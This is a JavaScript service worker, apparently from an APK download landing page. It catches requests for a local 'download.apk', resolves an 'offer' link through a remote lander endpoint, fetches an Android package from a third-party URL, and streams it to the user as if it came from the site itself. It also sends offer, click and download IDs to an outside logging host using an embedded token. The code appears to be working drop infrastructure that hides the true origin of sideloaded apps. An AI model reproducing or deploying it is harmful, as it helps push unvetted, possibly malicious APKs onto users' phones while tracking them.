importScripts('./params.js');

const ANALYT_LOGS_ENDPOINT = 'https://uiuirestorehere.art/i/v1/logs?token=phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL';

const logContext = {
  offer_id: 'undefined',
  click_id: 'undefined',
  file_name: 'undefined',
  download_id: 'undefined',
}

function pickClickId(params) {
  return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || ''
}

function syncLogContext(params) {
  try {
    const p = params || new URLSearchParams(self.location.search)
    logContext.offer_id = p.get('offer_id') || 'undefined'
    logContext.click_id = pickClickId(p) || 'undefined'
    logContext.file_name = p.get('utm_medium') || 'undefined'
    logContext.download_id = p.get('download_id') || 'undefined'
  } catch (error) {
    console.error('[sw] failed to read params', error)
  }
  return logContext
}

function contextAttributes() {
  return {
    offer_id: logContext.offer_id,
    click_id: logContext.click_id,
    file_name: logContext.file_name,
    download_id: logContext.download_id,
  }
}

function contextSuffix() {
  const parts = []
  if (logContext.offer_id !== 'undefined') parts.push(`offer_id: [${logContext.offer_id}]`)
  if (logContext.click_id !== 'undefined') parts.push(`click_id: [${logContext.click_id}]`)
  if (logContext.file_name !== 'undefined') parts.push(`file_name: [${logContext.file_name}]`)
  return parts.length ? ' ' + parts.join(', ') : ''
}

async function notifyDownloadCanceled(state, reason, ctx) {
  try {
    const attrs = {
      bytes: state ? state.bytes : 0,
      content_length: state ? state.contentLength : null,
      reason: reason === undefined ? 'undefined' : String(reason),
      download_id: (ctx && ctx.downloadId) || 'undefined',
      stream: (ctx && ctx.stream) || 'unknown',
    }
    sendLog('Download canceled by client', { level: 'warn', attributes: attrs })

    const clientId = ctx && ctx.clientId
    if (!clientId) {
      sendLog('Download canceled without clientId, cannot notify page', { level: 'error', attributes: attrs })
      return
    }

    let client = null
    try {
      client = await self.clients.get(clientId)
    } catch (error) {
      console.error('[sw] clients.get failed', error)
    }
    if (!client) {
      sendLog('Download canceled client not found, cannot notify page', { level: 'error', attributes: attrs })
      return
    }

    client.postMessage({
      type: 'DOWNLOAD_CANCELED',
      offer_id: logContext.offer_id,
      click_id: logContext.click_id,
      file_name: logContext.file_name,
      ...attrs,
    })
  } catch (error) {
    console.error('[sw] cancel notify failed', error)
  }
}

async function timed(label, promise, extra = {}) {
  const startedAt = performance.now()
  sendLog(`Await ${label}`, { attributes: extra })
  try {
    const value = await promise
    sendLog(`Awaited ${label}`, { attributes: { ...extra, await_duration_ms: Math.round(performance.now() - startedAt) } })
    return value
  } catch (error) {
    sendLog(`Step failed: ${label}`, { level: 'error', attributes: { ...extra, await_duration_ms: Math.round(performance.now() - startedAt), error_message: error.message } })
    throw error
  }
}

function sendLog(message, options = {}, event = null) {
  const now = (BigInt(Date.now()) * 1000000n).toString();

  const severity = {
    trace: [1, 'TRACE'],
    debug: [5, 'DEBUG'],
    info: [9, 'INFO'],
    warn: [13, 'WARN'],
    error: [17, 'ERROR'],
    fatal: [21, 'FATAL'],
  };

  const [severityNumber, severityText] =
    severity[options.level || 'info'] || severity.info;

  function toOtelValue(value) {
    if (typeof value === 'boolean') return { boolValue: value };
    if (typeof value === 'number') {
      return Number.isInteger(value)
        ? { intValue: String(value) }
        : { doubleValue: value };
    }
    if (value === null || value === undefined) {
      return { stringValue: '' };
    }
    if (typeof value === 'object') {
      return { stringValue: JSON.stringify(value) };
    }
    return { stringValue: String(value) };
  }

  const domain = self.location.hostname;

  const payload = {
    resourceLogs: [{
      resource: {
        attributes: [
          { key: 'service.name', value: { stringValue: 'sw4.js' } },
          { key: 'service.version', value: { stringValue: '4' } },
          { key: 'domain', value: { stringValue: domain } },
        ],
      },
      scopeLogs: [{
        scope: {
          name: 'service-worker',
          version: '1.0.0',
        },
        logRecords: [{
          timeUnixNano: now,
          observedTimeUnixNano: now,
          severityNumber,
          severityText,
          body: {
            stringValue: `${message}${contextSuffix()}`,
          },
          attributes: [
            ...Object.entries({ ...contextAttributes(), ...(options.attributes || {}) })
              .filter(([key]) => key !== 'domain')
              .map(([key, value]) => ({
                key,
                value: toOtelValue(value),
              })),
            {
              key: 'domain',
              value: { stringValue: domain },
            },
          ],
        }],
      }],
    }],
  };

const callerStack = new Error().stack; // Стектрейс: откуда именно вызвали sendLog
const startedAt = performance.now();

  const request = fetch(ANALYT_LOGS_ENDPOINT, {
    method: 'POST',
    mode: 'cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'text/plain;charset=UTF-8',
    },
    body: JSON.stringify(payload),
  }).then(async (response) => {
    const durationMs = Math.round(performance.now() - startedAt);
    const responseText = await response.text().catch((e) => `<read error: ${e.message}>`);

    if (!response.ok) {
      console.error('[Analyt] HTTP Error:', {
        status: response.status,
        statusText: response.statusText,
        url: response.url,
        redirected: response.redirected,
        type: response.type,
        durationMs,
        headers: Object.fromEntries(response.headers.entries()),
        responseBody: responseText,
        requestPayload: payload,
        callerStack,
      });
    } else {
      console.debug('[Analyt] Delivered:', {
        status: response.status,
        durationMs,
        responseBody: responseText,
      });
    }
  }).catch((error) => {
    const durationMs = Math.round(performance.now() - startedAt);

    console.error('[Analyt] Network / Fetch Failure:', {
      name: error?.name,
      message: error?.message,
      stack: error?.stack,
      cause: error?.cause, // В новых браузерах тут часто лежит сетевая причина (ERR_CONNECTION_REFUSED, CERT и т.д.)
      rawError: Object.getOwnPropertyNames(error || {}).reduce((acc, key) => {
        acc[key] = error[key];
        return acc;
      }, {}),
      endpoint: ANALYT_LOGS_ENDPOINT,
      durationMs,
      online: self.navigator?.onLine,
      requestPayload: payload,
      callerStack,
    });
  });

  // Продлеваем жизнь Service Worker, если передан ExtendableEvent.
  if (event && typeof event.waitUntil === 'function') {
    event.waitUntil(request);
  }
}

self.addEventListener('install', () => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('message', (event) => {
  sendLog('Message event')
  if (event.data && event.data.type === 'SKIP_WAITING') {
    sendLog('Skip waiting (message event)')
    self.skipWaiting();
  }
});

let apkPromise = null;
let apkError = null;
let apkRequestKey = null;
let apkState = null;

const OFFER_LINK_ENDPOINT = 'https://iijjuiu.shop/landers/gitand/offer-link.php';

function delay(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

function getTimestampWithMs() {
  const d = new Date();
  const pad = (n, len = 2) => String(n).padStart(len, '0');

  const yyyy = d.getFullYear();
  const mm   = pad(d.getMonth() + 1);
  const dd   = pad(d.getDate());
  const hh   = pad(d.getHours());
  const mi   = pad(d.getMinutes());
  const ss   = pad(d.getSeconds());
  const ms   = pad(d.getMilliseconds(), 3); // 0..999 -> "007", "123"

  return `${yyyy}-${mm}-${dd}_${hh}-${mi}-${ss}.${ms}`;
}

function sanitizeFileName(value) {
  const fallbackBase = 'download9918';

  const candidate = String(value || '')
        .replace(/\.apk$/i, '')
        .slice(0, 80);
  const isValid = candidate !== ''
        && !/^[ _-]+$/.test(candidate)
        && !/^ /.test(candidate)
        && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
  const base = isValid ? candidate : fallbackBase;

  const timestamp = getTimestampWithMs()

  return `${base}.${timestamp}.apk`;
}

function buildErrorResponse(message, status = 502) {
  sendLog(`Error response: ${message}, status: ${status}`, { level: 'error' })

  return new Response(message, {
    status,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      'Cache-Control': 'no-store',
    },
  });
}

function isUsableContentLength(value) {
  const length = Number(value);
  return Number.isSafeInteger(length) && length > 0;
}

function resetApkState() {
  apkPromise = null;
  apkError = null;
  apkRequestKey = null;
  apkState = null;
}

function notifySubscribers(state, method, value) {
  state.subscribers.forEach((subscriber) => {
    try {
      subscriber[method](value);
    } catch (error) {
      console.error('[download] subscriber notification failed', error);
    }
  });
}

async function pumpApkBody(state, response) {
  const reader = response.body.getReader();

  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) {
        state.done = true;
        notifySubscribers(state, 'close');
        state.subscribers.clear();
        return;
      }

      state.chunks.push(value);
      state.bytes += value.byteLength;
      state.chunkCount += 1;
      notifySubscribers(state, 'enqueue', value);
    }
  } catch (error) {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  }
}

function getTemplateValue(params, key) {
  const normalizedKey = key.toLowerCase();
  if (normalizedKey === 'clickid' || normalizedKey === 'click_id' || normalizedKey === 'utm_id') {
    return getClickId(params);
  }

  const value = params.get(key);
  if (value !== null) {
    return value;
  }

  if (key === 't2') {
    return params.get('utm_medium') || '';
  }

  if (key === 't3') {
    return params.get('utm_source') || '';
  }

  return '';
}

function getClickId(params) {
  return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || '';
}

function fillOfferUrlTemplate(value, params) {
  return value.replace(/\{([A-Za-z0-9_-]+)\}/g, (match, key) => {
    return encodeURIComponent(getTemplateValue(params, key));
  });
}

async function resolveOfferUrl(offerId, params) {
  syncLogContext(params)
  const clickId = getClickId(params);

  sendLog(`Resolve offer`)

  const endpoint = new URL(OFFER_LINK_ENDPOINT);
  endpoint.searchParams.set('offer_id', offerId);
  if (clickId) {
    endpoint.searchParams.set('click_id', clickId);
  }

  sendLog(`Fetch endpoint, get url: [${endpoint.href}]`)
  const response = await timed('fetch offer endpoint', fetch(endpoint.href, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include',
    redirect: 'follow',
    headers: {
      'Accept': 'application/json',
    },
  }))

  if (!response.ok) {
    sendLog(`Fetch endpoint failed, status ${response.status}`, { level: 'error' })
    throw new Error(`offer HTTP ${response.status}`);
  }

  const data = await timed('parse offer response', response.json());
  if (!data || typeof data.url !== 'string' || data.url.trim() === '') {
    sendLog(`Offer response url is missing, status ${response.status}`, { level: 'error' })
    throw new Error('offer response url is missing');
  }

  const sourceUrl = new URL(fillOfferUrlTemplate(data.url, params));
  if (!['http:', 'https:'].includes(sourceUrl.protocol)) {
    throw new Error('unsupported offer url protocol');
  }

  if (clickId) {
    sourceUrl.searchParams.set('utm_id', clickId);
  }

  return sourceUrl;
}

function createApkState(offerId, params, requestKey) {
  syncLogContext(params)
  sendLog(`Create APK state`)
  const state = {
    offerId,
    href: null,
    chunks: [],
    subscribers: new Set(),
    done: false,
    error: null,
    contentLength: null,
    contentDisposition: null,
    contentType: 'application/vnd.android.package-archive',
    bytes: 0,
    chunkCount: 0,
  };

  apkState = state;
  apkRequestKey = requestKey;

  apkPromise = (async () => {
    const sourceUrl = await timed('resolve offer url', resolveOfferUrl(offerId, params));
    state.href = sourceUrl.href;

    syncLogContext(params)

    sendLog(`Fetch sourceUrl: [${sourceUrl.href}]`)

    const response = await timed('fetch source apk', fetch(sourceUrl.href, {
      method: 'GET',
      mode: 'cors',
      credentials: 'include',
      redirect: 'follow',
    }))

    if (!response.ok) {
      sendLog(`Source apk fetch failed, status ${response.status}`, { level: 'error', source_url: sourceUrl.href })
      throw new Error(`HTTP ${response.status}`);
    }

    const contentLength = response.headers.get('content-length');
    if (isUsableContentLength(contentLength)) {
      state.contentLength = contentLength;
    }

    state.contentType = response.headers.get('content-type') || state.contentType;
    state.contentDisposition = response.headers.get('content-disposition');
    pumpApkBody(state, response).catch((error) => {
      console.error('[download] upstream body read failed', error);
    });

    return state;
  })().catch((error) => {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  });

  return state;
}

async function getApkState(offerId, params, requestKey) {
  syncLogContext(params)

  if (apkRequestKey && apkRequestKey !== requestKey) {
    sendLog("Reset APK state")
    resetApkState();
  }

  if (apkError) {
    sendLog("APK error, reset APK state", { level: "error" })
    resetApkState();
  }

  if (!apkState) {
    createApkState(offerId, params, requestKey);
  }

  await timed('await apk promise', apkPromise);
  return apkState;
}

async function buildDeferredApkResponse(offerId, fileName, params, requestKey, ctx) {
  syncLogContext(params)
  const state = await timed('get apk state', getApkState(offerId, params, requestKey));
  const headers = new Headers();
  headers.set('Content-Type', state.contentType);
  headers.set('Cache-Control', 'no-store');

  if (state.contentDisposition) {
    headers.set('Content-Disposition', state.contentDisposition);
  } else {
    headers.set('Content-Disposition', `attachment; filename="${fileName}"`);
  }

  if (state.contentLength) {
    headers.set('Content-Length', state.contentLength);
  }

  let subscriber = null;

  const stream = new ReadableStream({
    async start(controller) {
      try {
        await timed('delay before streaming', delay(100));

        for (const chunk of state.chunks) {
          controller.enqueue(chunk);
        }

        if (state.error) {
          controller.error(state.error);
          return;
        }

        if (state.done) {
          controller.close();
          return;
        }

        subscriber = {
          enqueue: (chunk) => controller.enqueue(chunk),
          close: () => controller.close(),
          error: (error) => controller.error(error),
        };

        state.subscribers.add(subscriber);
      } catch (error) {
        controller.error(error);
      }
    },
    cancel(reason) {
      if (subscriber && state) {
        state.subscribers.delete(subscriber);
      }
      const stream = (ctx && ctx.stream) || 'unknown'
      const fullyDelivered = !!state && (
        state.done ||
        (isUsableContentLength(state.contentLength) && state.bytes >= Number(state.contentLength))
      )
      if (stream === 'tracker') {
        sendLog('Cancel from tracker stream ignored', { level: 'warn', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined' } })
        return
      }
      if (fullyDelivered) {
        sendLog('Late cancel after full delivery ignored', { level: 'warn', attributes: { download_id: (ctx && ctx.downloadId) || 'undefined', bytes: state.bytes } })
        return
      }
      notifyDownloadCanceled(state, reason, ctx);
    },
  });

  return new Response(stream, {
    status: 200,
    statusText: 'OK',
    headers,
  });
}

self.addEventListener('fetch', (event) => {
  const requestUrl = new URL(event.request.url);

  const downloadUrl = new URL('./download.apk', self.location.href);
  if (requestUrl.origin !== downloadUrl.origin || requestUrl.pathname !== downloadUrl.pathname) {
    return;
  }

  const isTracker = event.request.headers.get('X-DL-Track') === '1'
  const downloadId = requestUrl.searchParams.get('download_id') || 'undefined'
  const ctx = {
    clientId: event.clientId || '',
    downloadId,
    stream: isTracker ? 'tracker' : 'iframe',
  }

  event.respondWith((async () => {
    try {
      const params = new URLSearchParams(await timed('read saved params', B1Params.read()));
      params.set('download_id', downloadId)

      const offerId = params.get('offer_id');
      const clickId = getClickId(params)

      syncLogContext(params)

      if (!offerId || !offerId.trim()) {
        sendLog('Missing saved offer_id parameter', { level: 'error' })
        return buildErrorResponse('Missing saved offer_id parameter', 400);
      }

      return await timed('build deferred apk response', buildDeferredApkResponse(
        offerId.trim().slice(0, 80),
        sanitizeFileName(params.get('utm_medium')),
        params,
        params.toString(),
        ctx
      ));
    } catch (error) {
      sendLog(`APK download failed: ${error.message}`, { level: 'error', error_message: error.message })
      return buildErrorResponse(`APK download failed: ${error.message}`, 502);
    }
  })());
});
